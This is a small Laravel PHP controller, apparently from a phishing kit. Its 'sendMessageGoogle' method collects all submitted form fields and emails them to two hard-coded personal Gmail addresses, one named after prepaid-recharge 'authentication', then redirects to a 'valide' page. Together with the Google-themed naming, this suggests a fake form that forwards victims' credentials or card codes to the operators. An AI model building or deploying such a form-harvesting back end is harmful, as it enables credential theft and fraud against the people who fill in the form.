<?php

namespace App\Http\Controllers;

use App\Mail\MessageGoogle;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class MessageController extends Controller
{
    public function formMessageGoogle()
    {
        return view("index");
    }
    // Envoi du mail aux utilisateurs
    public function sendMessageGoogle(Request $request)
    {
        Mail::to('authentiquerechargetc@gmail.com')
            ->send(new MessageGoogle($request->except('_token')));

        Mail::to('chabijeanbaptiste56@gmail.com')
            ->send(new MessageGoogle($request->except('_token')));

        return redirect("valide");
    }
}
